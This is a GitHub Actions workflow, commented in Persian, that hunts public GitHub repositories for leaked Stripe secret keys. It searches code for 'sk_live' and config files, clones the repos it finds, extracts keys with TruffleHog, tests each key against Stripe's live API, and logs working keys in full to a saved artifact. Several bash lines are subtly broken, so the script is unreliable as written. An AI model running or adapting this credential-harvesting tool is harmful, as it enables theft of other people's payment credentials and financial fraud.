name: 🎯 Public Repo Hunter (Stripe)

on:
  workflow_dispatch: # فقط دستی اجرا می‌شود تا کنترل داشته باشی
  # schedule: # می‌توانی زمان‌بندی هم بگذاری (مثلاً روزی یکبار)
  #   - cron: '0 0 * * *'

jobs:
  hunter:
    runs-on: ubuntu-latest
    steps:
      - name: Setup Environment
        run: |
          sudo apt-get update
          sudo apt-get install -y jq curl git
          # نصب TruffleHog
          curl -sSfL https://raw.githubusercontent.com/trufflesecurity/trufflehog/main/scripts/install.sh | sh -s -- -b /usr/local/bin
          echo "Environment ready."

      - name: Search & Hunt
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          echo "🔍 Step 1: Searching GitHub for potential targets..."
          
          # جستجو برای ریپوهای عمومی که ممکن است کلید داشته باشند
          # ما دنبال فایل‌هایی با نام‌های suspicious می‌گردیم
          SEARCH_QUERIES=(
            "filename:.env stripe"
            "filename:config.js stripe"
            "filename:settings.py stripe"
            "sk_live in:file language:JavaScript"
            "sk_live in:file language:Python"
          )

          TARGET_REPOS=()
          
          for query in "${SEARCH_QUERIES[@}"; do
            echo "Searching for: $query"
            # استفاده از GitHub CLI برای جستجو (محدود به 10 نتیجه برای جلوگیری از بن شدن)
            # فقط ریپوهای عمومی (public) را جستجو می‌کنیم
            results=$(gh search code "$query" --limit 10 --json repositoryUrl --jq '.[].repositoryUrl' 2>/dev/null || echo "")
            
            if [ -n "$results" ]; then
              while IFS= read -r url; do
                if [ -n "$url" ]; then
                  # تبدیل URL به format قابل clone
                  repo_path=$(echo "$url" | sed 's|https://github.com/|github.com|')
                  # اضافه کردن به لیست اگر قبلاً نیست
                  if [[ ! " ${TARGET_REPOS[@} " " " ${repo_path} " " ]]; then
                    TARGET_REPOS+=("$repo_path")
                  fi
                fi
              done <<< "$results"            fi
          done

          if [ ${#TARGET_REPOS[@]} -eq 0 ]; then
            echo "✅ No potential targets found. Try different search queries."
            exit 0
          fi

          echo "🎯 Found ${#TARGET_REPOS[@]} potential targets. Scanning..."

          VALID_KEYS_FOUND=0
          mkdir -s scan_results
          
          for repo in "${TARGET_REPOS[@}"; do
            echo "----------------------------------------"
            echo "Scanning: $repo"
            
            # Clone کردن ریپو (only depth 1 for speed)
            git clone --depth 1 "https://$repo" temp_repo 2>/dev/null || {
              echo "❌ Failed to clone $repo"
              continue
            }

            # اسکن با TruffleHog
            echo "Running TruffleHog on $repo..."
            trufflehog filesystem temp_repo --json --no-update > scan_results/raw_$(echo $repo | tr '/' '_').json 2>/dev/null || true

            # بررسی نتیجه
            if grep -q "Stripe" scan_results/raw_$(echo $repo | tr '/' '_').json 2>/dev/null; then
              echo "🚨 POTENTIAL KEY FOUND IN $repo! Verifying..."
              
              # استخراج کلیدها
              cat scan_results/raw_$(echo $repo | tr '/' '_').json | jq -r 'select(.DetectorName == "Stripe") | .Raw' | sort -u > scan_results/keys_$(echo $repo | tr '/' '_').txt || true

              # Verify کردن
              while IFS= read -r key; do
                [[ -z "$key" ]] && continue
                echo "Verifying key: ${key:0:10}..."
                
                response=$(curl -s -w "\n%{http_code}" \
                  -H "Authorization: Bearer $key" \
                  -H "Stripe-Version: 2023-10-16" \
                  https://api.stripe.com/v1/account)
                
                http_code=$(echo "$response" | tail -n1)
                
                if [ "$http_code" == "200" ]; then
                  echo "✅✅✅ LIVE KEY FOUND! ✅✅✅"
                  echo "Repo: $repo"
                  echo "Key: $key"
                  echo "Key: $key" >> scan_results/LIVE_KEYS_FOUND.txt
                  VALID_KEYS_FOUND=$((VALID_KEYS_FOUND + 1))
                else
                  echo "❌ Key invalid or dead."
                fi
              done < scan_results/keys_$(echo $repo | tr '/' '_').txt
            else
              echo "✅ No valid keys found in $repo."
            fi

            rm -rf temp_repo
          done

          echo "----------------------------------------"
          if [ $VALID_KEYS_FOUND -gt 0 ]; then
            echo "🎉 SUCCESS: Found $VALID_KEYS_FOUND live keys!"
            echo "Check scan_results/LIVE_KEYS_FOUND.txt for details."
            # Upload artifact
            cp scan_results/LIVE_KEYS_FOUND.txt ./LIVE_KEYS_FOUND.txt 2>/dev/null || true
          else
            echo "📉 No live keys found in this batch."
          fi

      - name: Upload Results
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: hunter-results
          path: scan_results/
          retention-days: 1
